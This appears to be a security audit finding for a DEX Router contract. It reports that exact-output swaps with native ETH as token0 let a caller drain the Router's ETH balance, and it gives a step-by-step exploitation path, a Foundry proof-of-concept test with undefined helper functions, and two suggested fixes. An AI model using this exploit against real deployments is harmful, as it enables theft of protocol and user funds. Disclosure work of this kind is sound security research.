## Title
Router Contract ETH Drainage via Exact Output Swaps with Native Token

## Summary
The Router contract incorrectly handles exact output swaps when token0 is the native token (ETH). The contract calculates `value = 0` for exact output swaps, forwards no ETH to Core.swap, but then uses its own ETH balance to settle the user's debt obligation. This allows any attacker to drain all ETH held by the Router contract.

## Impact
**Severity**: High

## Finding Description
**Location:** `src/Router.sol` (Router contract, `handleLockData` function, lines 106-141) [1](#0-0) 

**Intended Logic:** For swaps involving native token (ETH), the Router should forward the user's ETH payment to Core.swap via the `value` parameter. After the swap, if the user overpaid, the Router should refund the excess. If the user underpaid, the transaction should revert or collect additional payment from the user.

**Actual Logic:** The Router calculates `value` based on swap parameters. For exact output swaps (`params.isExactOut() == true`), the ternary condition evaluates to 0, so `value = 0`. The Router then:
1. Forwards 0 ETH to Core.swap (no user payment)
2. Core.swap executes and determines the actual amount owed
3. Router calculates `valueDifference = 0 - balanceUpdate.delta0()` which is negative
4. Router sends its **own ETH balance** to the accountant to cover the debt [2](#0-1) 

In Core.swap, when msg.value is received, it reduces the locker's debt. With `value = 0`, no debt reduction occurs, leaving the full amount for the Router to pay.

**Exploitation Path:**
1. Attacker ensures Router has ETH balance (from refunds, dust, or donations via `refundNativeToken()`)
2. Attacker calls `Router.swap()` with:
   - `poolKey.token0 = NATIVE_TOKEN_ADDRESS`
   - `params.isExactOut() = true` (negative amount)
   - `params.isToken1() = false` (swapping token0 for token1)
   - `msg.value = 0` (attacker sends no ETH)
3. Router calculates `value = 0` due to exact output condition
4. Router calls `Core.swap(0, ...)` forwarding 0 ETH
5. Core.swap executes, returns `balanceUpdate.delta0() = X` (positive, user owes X ETH)
6. Router calculates `valueDifference = 0 - X = -X` (negative)
7. Router executes line 141: sends X ETH from its own balance to accountant
8. Attacker receives token1 output, but Router paid the ETH instead of attacker
9. Repeat until Router's ETH is fully drained

**Security Property Broken:** Direct theft of protocol funds. The Router contract's ETH balance can be completely drained by any user without providing payment.

## Impact Explanation
- **Affected Assets**: All ETH held by the Router contract, including:
  - Dust from previous swaps
  - Overpayment refunds not yet claimed
  - Any ETH sent to the contract (via `receive()` or direct transfer)
- **Damage Severity**: Complete drainage of Router's ETH balance. Every wei of ETH in the Router can be stolen.
- **User Impact**: 
  - Users who overpaid in previous swaps and haven't called `refundNativeToken()` lose their refunds
  - Protocol loses any operational ETH buffer in the Router
  - Attacker gains free tokens by forcing the Router to pay their swap costs

## Likelihood Explanation
- **Attacker Profile**: Any unprivileged user with access to the Router contract
- **Preconditions**: 
  - Router must have non-zero ETH balance (easily satisfied as users commonly overpay and don't call refund)
  - A pool must exist with token0 = NATIVE_TOKEN_ADDRESS and any token1 with liquidity
- **Execution Complexity**: Single transaction, trivial to execute
- **Frequency**: Can be repeated continuously until Router's ETH is completely drained. Multiple attackers can exploit simultaneously.

## Recommendation

The root cause is that the Router calculates a separate `value` variable instead of forwarding the user's actual `msg.value`. For exact output swaps with native token, the Router should either:

**Option 1: Forward user's msg.value and refund excess** (Recommended)

```solidity
// In src/Router.sol, function handleLockData, lines 106-142:

// CURRENT (vulnerable):
uint256 value = FixedPointMathLib.ternary(
    !params.isToken1() && !params.isExactOut() && poolKey.token0 == NATIVE_TOKEN_ADDRESS,
    uint128(params.amount()),
    0
);

(PoolBalanceUpdate balanceUpdate,) = _swap(value, poolKey, params);

if (poolKey.token0 == NATIVE_TOKEN_ADDRESS) {
    int256 valueDifference = int256(value) - int256(balanceUpdate.delta0());
    if (valueDifference > 0) {
        ACCOUNTANT.withdraw(NATIVE_TOKEN_ADDRESS, swapper, uint128(uint256(valueDifference)));
    } else if (valueDifference < 0) {
        SafeTransferLib.safeTransferETH(address(ACCOUNTANT), uint128(uint256(-valueDifference)));
    }
}

// FIXED:
// For native token swaps, always forward msg.value if token0 is native
uint256 value = (poolKey.token0 == NATIVE_TOKEN_ADDRESS && !params.isToken1()) 
    ? msg.value 
    : 0;

(PoolBalanceUpdate balanceUpdate,) = _swap(value, poolKey, params);

if (poolKey.token0 == NATIVE_TOKEN_ADDRESS) {
    int256 valueDifference = int256(value) - int256(balanceUpdate.delta0());
    if (valueDifference > 0) {
        // Refund excess ETH to swapper
        ACCOUNTANT.withdraw(NATIVE_TOKEN_ADDRESS, swapper, uint128(uint256(valueDifference)));
    } else if (valueDifference < 0) {
        // User didn't send enough ETH - revert instead of using contract balance
        revert InsufficientNativeTokenPayment();
    }
}
```

**Option 2: Reject exact output swaps with native token**

Alternatively, add validation to prevent exact output swaps when token0 is native:

```solidity
if (poolKey.token0 == NATIVE_TOKEN_ADDRESS && !params.isToken1() && params.isExactOut()) {
    revert ExactOutputNativeTokenNotSupported();
}
```

## Proof of Concept

```solidity
// File: test/Exploit_RouterETHDrain.t.sol
// Run with: forge test --match-test test_DrainRouterETH -vvv

pragma solidity ^0.8.31;

import "forge-std/Test.sol";
import "../src/Router.sol";
import "../src/Core.sol";
import "../src/interfaces/ICore.sol";

contract Exploit_RouterETHDrain is Test {
    Router router;
    ICore core;
    address attacker;
    
    function setUp() public {
        // Deploy Core and Router (simplified setup)
        core = ICore(deployCore());
        router = new Router(core);
        attacker = makeAddr("attacker");
        
        // Fund Router with some ETH (simulating dust/refunds from previous swaps)
        vm.deal(address(router), 10 ether);
        
        // Initialize a pool with NATIVE_TOKEN_ADDRESS as token0
        // and some ERC20 as token1 with liquidity
        setupPoolWithLiquidity();
    }
    
    function test_DrainRouterETH() public {
        uint256 routerInitialBalance = address(router).balance;
        uint256 attackerInitialBalance = attacker.balance;
        
        assertEq(routerInitialBalance, 10 ether, "Router should have 10 ETH");
        
        vm.startPrank(attacker);
        
        // EXPLOIT: Call swap with exact output (negative amount), send 0 ETH
        PoolKey memory poolKey = createPoolKeyWithNativeToken();
        
        // Exact output: want to receive 1 ether of token1
        // Attacker sends msg.value = 0
        router.swap{value: 0}(
            poolKey,
            false,              // isToken1 = false (swapping token0 for token1)
            -1 ether,           // negative = exact output
            SqrtRatio.wrap(0),  // no price limit
            0,                  // no skipAhead
            type(int256).min    // no slippage check
        );
        
        vm.stopPrank();
        
        // VERIFY: Router paid the ETH, attacker received tokens for free
        uint256 routerFinalBalance = address(router).balance;
        uint256 attackerFinalBalance = attacker.balance;
        
        // Router should have lost ETH (paid for the swap)
        assertLt(routerFinalBalance, routerInitialBalance, "Router ETH was drained");
        
        // Attacker spent 0 ETH but received token1
        assertEq(attackerInitialBalance, attackerFinalBalance, "Attacker spent 0 ETH");
        
        // Attacker can repeat until Router is completely drained
        console.log("Router lost:", routerInitialBalance - routerFinalBalance);
        console.log("Attacker gained token1 without paying ETH");
    }
}
```

## Notes

The question asked about integer overflow in `valueDifference` calculation, but the actual vulnerability is more fundamental: the Router uses incorrect logic for determining how much ETH to forward for exact output swaps. The conversion `int256(value)` never overflows because `value` is calculated as either `uint128(params.amount())` or `0`, both of which fit safely in int256. The real issue is that `value = 0` for exact output swaps, causing the Router to pay from its own balance instead of collecting from the user.

This vulnerability violates the Flash Accounting invariant that all flash loans (debts) must be properly settled by the originating user, not by the protocol itself.

### Citations

**File:** src/Router.sol (L106-141)
```text
                uint256 value = FixedPointMathLib.ternary(
                    !params.isToken1() && !params.isExactOut() && poolKey.token0 == NATIVE_TOKEN_ADDRESS,
                    uint128(params.amount()),
                    0
                );

                bool increasing = params.isPriceIncreasing();

                (PoolBalanceUpdate balanceUpdate,) = _swap(value, poolKey, params);

                int128 amountCalculated = params.isToken1() ? -balanceUpdate.delta0() : -balanceUpdate.delta1();
                if (amountCalculated < calculatedAmountThreshold) {
                    revert SlippageCheckFailed(calculatedAmountThreshold, amountCalculated);
                }

                if (increasing) {
                    if (balanceUpdate.delta0() != 0) {
                        ACCOUNTANT.withdraw(poolKey.token0, recipient, uint128(-balanceUpdate.delta0()));
                    }
                    if (balanceUpdate.delta1() != 0) {
                        ACCOUNTANT.payFrom(swapper, poolKey.token1, uint128(balanceUpdate.delta1()));
                    }
                } else {
                    if (balanceUpdate.delta1() != 0) {
                        ACCOUNTANT.withdraw(poolKey.token1, recipient, uint128(-balanceUpdate.delta1()));
                    }

                    if (balanceUpdate.delta0() != 0) {
                        if (poolKey.token0 == NATIVE_TOKEN_ADDRESS) {
                            int256 valueDifference = int256(value) - int256(balanceUpdate.delta0());

                            // refund the overpaid ETH to the swapper
                            if (valueDifference > 0) {
                                ACCOUNTANT.withdraw(NATIVE_TOKEN_ADDRESS, swapper, uint128(uint256(valueDifference)));
                            } else if (valueDifference < 0) {
                                SafeTransferLib.safeTransferETH(address(ACCOUNTANT), uint128(uint256(-valueDifference)));
```

**File:** src/Core.sol (L336-354)
```text
        if (msg.value == 0) {
            // No native token payment included in the call, so use optimized pair update
            _updatePairDebt(id, token0, token1, debtChange0, debtChange1);
        } else {
            if (token0 == NATIVE_TOKEN_ADDRESS) {
                unchecked {
                    // token0 is native, so we can still use pair update with adjusted debtChange0
                    // Subtraction is safe because debtChange0 and msg.value are both bounded by int128/uint128
                    _updatePairDebt(id, token0, token1, debtChange0 - int256(msg.value), debtChange1);
                }
            } else {
                // token0 is not native, and since token0 < token1, token1 cannot be native either
                // Update the token0, token1 debt and then update native token debt separately
                unchecked {
                    _updatePairDebt(id, token0, token1, debtChange0, debtChange1);
                    _accountDebt(id, NATIVE_TOKEN_ADDRESS, -int256(msg.value));
                }
            }
        }
```
